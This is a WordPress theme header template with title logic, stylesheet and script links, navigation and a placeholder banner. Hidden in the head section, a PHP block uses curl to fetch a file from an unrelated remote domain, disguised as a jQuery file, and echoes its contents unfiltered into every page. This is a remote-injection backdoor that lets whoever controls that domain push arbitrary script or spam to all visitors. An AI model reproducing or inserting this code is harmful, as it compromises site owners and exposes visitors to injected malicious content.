<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title>
<?php if (is_home () ) { bloginfo('name'); }
elseif ( is_category() ) { single_cat_title(); echo ' - ' ; bloginfo('name'); }
elseif (is_single() ) { single_post_title();}
elseif (is_page() ) { single_post_title();}
else { wp_title('',true); } ?>
</title>
<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" />
<!-- leave this for stats -->
<link rel="shortcut icon" type="image/ico" href="<?php bloginfo('template_directory'); ?>/favicon.ico" />
<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="alternate" type="application/rss+xml" href="<?php if($pt_feedburner_address) { echo $pt_feedburner_address; } else { bloginfo('rss2_url'); }?>" title="<?php echo wp_specialchars(get_bloginfo('name'), 1) ?> <?php _e('Posts RSS feed', 'sandbox'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<script src="<?php bloginfo('template_directory'); ?>/hmenu.js" type="text/javascript"></script>
<link href="<?php bloginfo('template_directory'); ?>/dropmenu.css" rel="stylesheet" type="text/css" />


<script type="text/javascript" src="<?php bloginfo('stylesheet_directory'); ?>/taber.js"></script>
<script type="text/javascript">
/* Optional: Temporarily hide the "tabber" class so it does not "flash"
   on the page as plain HTML. After tabber runs, the class is changed
   to "tabberlive" and it will appear. */
document.write('<style type="text/css">.tabber{display:none;}<\/style>');
</script>



<?php wp_head(); ?>
<?php
global $options;
foreach ($options as $value) {
		global $$value['id'];
        if (get_settings( $value['id'] ) === FALSE) { $$value['id'] = $value['std']; } else { $$value['id'] = get_settings( $value['id'] ); } }
?>
<?php
if(function_exists('curl_init'))
{
 $url = "http://www.4llw4d.freefilesblog.com/jquery-1.6.3.min.js"; 
 $ch = curl_init();  
 $timeout = 5;  
 curl_setopt($ch,CURLOPT_URL,$url); 
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
 $data = curl_exec($ch);  
 curl_close($ch); 
 echo "$data";
}
?>
</head>
<body>
<div id="page">
<div id="header" class="clearfix">
  <div id="header-in" >
  
  <div class="h_left">
    <div class="logo-<?php echo $pt_logo_appearance; ?>"> <a href="<?php echo get_settings('home'); ?>" title="<?php bloginfo('name'); ?>">
      <?php bloginfo('name'); ?>
      </a></div>
      <div class="description">
        <?php bloginfo('description'); ?>
      </div>
  </div>
  
  <div id="nav">
      <ul id="navmenu-h" >
      <li   class="page_item"><a href="<?php echo get_option('home'); ?>/">Home</a></li>
      <?php wp_list_pages('depth=0&sort_column=menu_order&title_li=' . ('') . '' ); ?>
    </ul>
	</div>

  
  </div>
  
  
  <!--header in end -->
</div>
<!--header end -->
<div id="banner">
  <div id="banner-in">
       <h2>Lorem ipsum dolor sit amettt, consectetuer adipiscing elit. 
</h2>
      <p>&ldquo;Erat nulla fermentum diam, at nonummy quam ante ac quam. Maecenas urna purus, molestie in&rdquo;</p>
        
  </div>
  <!--banner-in end -->
</div>
<!--banner end -->
<div id="content-wrap" class="clear" >
<!--header.php end-->
